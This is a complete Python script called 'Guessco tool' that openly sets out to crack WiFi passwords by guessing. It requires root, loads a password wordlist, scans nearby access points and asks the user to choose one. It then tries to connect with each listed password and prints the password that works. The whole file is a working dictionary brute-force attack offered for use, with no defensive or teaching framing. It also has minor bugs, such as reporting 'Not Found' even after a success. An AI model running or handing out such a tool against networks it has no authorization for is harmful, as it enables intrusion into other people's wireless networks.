#!/usr/bin/python
# -*- coding : utf-8 -*-

"""
              :::Guessco tool:::
    Tool to get [WIFI] password through guessing
    Author : Mahmoud Abd Alkarim(@Maakthon)

"""

try:
    from wireless import *
    from wifi import *
except ImportError as err:
    print("\nMake sure you have to installed [wifi,wireless] modules , {}\n".format(err))
    exit(1)    
from sys import *
from os import *
import io

def logo():
    print("""
    
   ____                                    _   ___  
  / ___|_   _  ___  ___ ___  ___ _____   _/ | / _ \ 
 | |  _| | | |/ _ \/ __/ __|/ __/ _ \ \ / / || | | |
 | |_| | |_| |  __/\__ \__ \ (_| (_) \ V /| || |_| |
  \____|\__,_|\___||___/___/\___\___( )_/ |_(_)___/ 
                                    |/              
                                                    --Mahmoud AbdAlkarim(@Maakthon)
                                                    _______________________________
    """)

if len(argv) < 2 or len(argv) > 2:
    print("\n [!] Usage : python script.py FileName [!]\n")
    exit(1)

file_name = argv[1]

def rootchk():
    user = popen('whoami').read()
    if user.strip() != 'root':
        print ("""
        [!] You must run this script with root privileges [!]
        _____________________________________________________
        """)
        exit(1)
        
def get_file(file_name):
    global pass_list
    pass_list = []
    try:
        with io.open(file_name,'r') as file_:
            for line in file_:
                pass_list.append(line.strip())
    except IOError:
        print("\n[!] No file with this name \n")
        exit(1)        
        
def discover():
    wireless  = Wireless()
    chk_power = wireless.power()
    if chk_power == False:
        print("[!] Your WIFI is turned OFF make it ON")
        exit(1)
    get_interface = wireless.interface()
    cells = Cell.all(get_interface)
    counter = 1
    system('clear')
    logo()
    print("\tMac address\t\tChannel\t\tSignal\t\tENC\t\tSSID")
    print("_"*100)
    ssid_dict = {}
    encr_dict = {}
    for cell in cells:
        ssid_dict.update({counter:cell.ssid})
        encr_dict.update({counter:cell.encrypted})

        print(
        """\n[{0}]- {1}\t\t{2}\t\t{3}\t\t{4}\t\t{5}    
        """.format(counter,cell.address,cell.channel,cell.signal,cell.encrypted,cell.ssid))
        counter+=1
        
    try:
       chknum = int(raw_input("\n[+] Choose WIFI number to access : "))
    except ValueError:
       print("\n[!] Wrong input !!!")
       exit(1)
   
    global ssid_name
    
    for key,value in ssid_dict.items():
        if chknum == key:
            ssid_name = value
            
    for key,value in encr_dict.items():
        if chknum == key and value == False:
            print("The {0} is already OPEN".format(ssid_name))
            exit(1)
 
   
    while chknum > len(ssid_dict) or chknum == 0:
        length_of_ssid_dict = len(ssid_dict)
        print("\n[!] Number input wrong choose from 1 to {0}".format(length_of_ssid_dict))
        try:
            chknum = int(raw_input("\n[+] Choose WIFI number to access : "))
        except ValueError:
            print("[!] That wasn't a number [!]")
           
def play_time(pass_list,ssid_name):

    wireless = Wireless()
    pass_list = pass_list

    try:
        for passkey in pass_list:
            get_access = wireless.connect(ssid=str(ssid_name) , password=str(passkey))
            if get_access == True:
                print("\n[*] Connected to SSID = {0} , Password = {1}\n".format(ssid_name,passkey))
                break
        print("\n[!] Not Found!!!\n")       
    except Exception as err:
        print(err)     

def main():
    logo()
    rootchk()
    get_file(file_name)
    discover()
    play_time(pass_list,ssid_name)

if __name__ == '__main__':        
    main()
